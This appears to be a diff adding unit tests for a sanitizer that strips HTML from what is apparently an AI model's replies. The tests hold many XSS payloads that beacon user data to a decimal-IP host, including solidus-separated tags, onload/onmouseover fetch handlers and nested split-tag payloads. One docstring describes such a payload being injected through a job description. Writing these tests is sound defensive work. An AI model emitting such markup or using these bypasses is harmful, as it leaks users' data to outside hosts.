@@ -2731,3 +2731,155 @@ class SanitizeReplyTests(TestCase):
         out = self._clean(text)
         self.assertNotIn("cdn.example.tld", out)
         self.assertEqual(out, "Our mirror () is fast")
+
+    # --- R1: HTML5 treats "/" as an attribute separator -------------------------
+
+    def _assert_no_live_markup(self, out):
+        """Round-trip the sanitized text through a REAL HTML tokenizer.
+
+        String matching only proves our own regexes agree with themselves.
+        html.parser is what tells us whether a browser would still see a
+        fetch-capable element: `<img/src=x>` contains no space, so the
+        pre-fix `\\s`-anchored matcher left it alone, yet html.parser reports
+        tag='img' attrs=[('src', 'x')] for it — a live beacon.
+        """
+        from html.parser import HTMLParser
+
+        found = []
+
+        class _Collect(HTMLParser):
+            def handle_starttag(self, tag, attrs):
+                found.append((tag, attrs))
+
+            handle_startendtag = handle_starttag
+
+        parser = _Collect()
+        parser.feed(out)
+        parser.close()
+        live = [(tag, attrs) for tag, attrs in found if attrs]
+        self.assertEqual(live, [], f"fetch-capable markup survived in {out!r}")
+        self.assertNotIn("3232235777", out)
+
+    def test_solidus_separated_attributes_are_stripped(self):
+        """HTML5's tokenizer treats "/" inside a tag as an attribute
+        separator, so every one of these is a fully-formed tag to a browser
+        even though none has whitespace after the tag name. The decimal-IPv4
+        host has no dot, so the protocol-relative matcher is no backstop —
+        tag stripping is the only thing standing between these and the
+        seeker's data."""
+        beacon = "//3232235777/p?d=Ada"
+        for raw in [
+            f'<img/src="{beacon}">',
+            f'<image/src="{beacon}">',
+            f'<iframe/src="{beacon}">',
+            f"<svg/onload=\"fetch('{beacon}')\">",
+            f'<video/poster="{beacon}">',
+            f'<object/data="{beacon}">',
+            f'<img//src="{beacon}">',
+            f'<img/ src="{beacon}">',
+            f'<IMG/SRC="{beacon}">',
+        ]:
+            with self.subTest(raw=raw):
+                out = self._clean(raw)
+                self.assertEqual(out, "")
+                self._assert_no_live_markup(out)
+
+    def test_solidus_separated_event_handler_on_an_unlisted_tag_is_stripped(self):
+        """Same separator trick, but on a tag whose NAME is harmless — only
+        the unlisted-name branch can catch this one."""
+        out = self._clean(
+            "<div/onmouseover=\"fetch('//3232235777/p?d=Ada')\">x</div>")
+        self.assertIn("x", out)
+        self._assert_no_live_markup(out)
+
+    # --- R2: the pass bound must fail CLOSED, not open --------------------------
+
+    @staticmethod
+    def _nested_payload(depth):
+        """Split-tag nesting: each level's own text reassembles into a live
+        <img ...> only after the level inside it is removed, so depth n needs
+        n+1 substitution passes to fully clear."""
+        beacon = '<img src="//3232235777/p?d=Ada">'
+        for _ in range(depth):
+            beacon = '<i' + beacon + 'mg src="//3232235777/p?d=Ada">'
+        return beacon
+
+    def test_nesting_within_the_pass_bound_still_clears(self):
+        raw = self._nested_payload(9)
+        self.assertEqual(self._clean(raw), "")
+
+    def test_nesting_that_exhausts_the_pass_bound_fails_closed(self):
+        """Depth 10 needs 11 passes. Before the fix the loop gave up and
+        returned its residue — an intact `<img src="//3232235777/p?d=Ada">`
+        straight to the client. ~350 characters, comfortably inside a
+        1024-token reply and fully specifiable from an injected job
+        description."""
+        raw = self._nested_payload(10)
+        self.assertLess(len(raw), 400, "payload must stay cheap to be a real threat")
+        out = self._clean(raw)
+        self.assertEqual(out, "")
+        self._assert_no_live_markup(out)
+
+    def test_nesting_one_past_the_bound_fails_closed(self):
+        """Depth 11's residue was `<i<img src="//...">mg src="//...">` — not
+        even a single well-formed tag, which is exactly why "return whatever
+        is left" is not a safe answer."""
+        out = self._clean(self._nested_payload(11))
+        self.assertEqual(out, "")
+        self._assert_no_live_markup(out)
+
+    def test_deep_nesting_far_past_the_bound_fails_closed(self):
+        for depth in (12, 25, 60):
+            with self.subTest(depth=depth):
+                out = self._clean(self._nested_payload(depth))
+                self.assertEqual(out, "")
+                self._assert_no_live_markup(out)
+
+    # --- R3: generic default parameters are not HTML attributes -----------------
+
+    def test_generic_default_parameters_survive_intact(self):
+        """`<typename T = int>` has an "=" between "<" and ">" but is not a
+        tag: real attribute assignments bind their name tightly (`src=`,
+        `onmouseover=`), while a generic default is a spaced ` = ` after a
+        type parameter."""
+        for text in [
+            "template <typename T = int> class Foo;",
+            "template<int N = 4> struct S;",
+            "function f<T = string>(x: T) { return x; }",
+            "struct Foo<T = u32>;",
+        ]:
+            with self.subTest(text=text):
+                self.assertEqual(self._clean(text), text)
+
+    def test_comparison_prose_with_an_equals_between_the_brackets_survives(self):
+        text = "Trigger it if x<y and z=1 then w>0 holds."
+        self.assertEqual(self._clean(text), text)
+
+    def test_multi_line_prose_is_never_swallowed_by_one_stray_bracket(self):
+        """The worst of the round-3 over-matches: `[^<>]*` matched newlines,
+        so a single `<word ` could eat an unbounded multi-line span up to the
+        next ">" whenever an "=" fell in between — this three-line reply
+        collapsed to "Use ad."."""
+        text = ("Use a<b for the check\nand set flag=1 when done\n"
+                "so that c>d.")
+        self.assertEqual(self._clean(text), text)
+
+    # --- R3 guard: the tightened branch must still catch real payloads ----------
+
+    def test_unlisted_tag_with_an_attribute_payload_is_still_stripped(self):
+        """Constraining the unlisted-name branch must not reopen it. Each of
+        these is a legal HTML attribute shape: first-position, non-first
+        position, spaced "=", and newline-separated."""
+        beacon = "//3232235777/p?d=Ada"
+        for raw in [
+            f'<div onmouseover="fetch(\'{beacon}\')">x</div>',
+            f'<body background="{beacon}">x',
+            f'<table background="{beacon}">x',
+            f'<div hidden onmouseover="fetch(\'{beacon}\')">x</div>',
+            f'<div onmouseover = "fetch(\'{beacon}\')">x</div>',
+            f'<div\nonmouseover="fetch(\'{beacon}\')">x</div>',
+        ]:
+            with self.subTest(raw=raw):
+                out = self._clean(raw)
+                self.assertIn("x", out)
+                self._assert_no_live_markup(out)
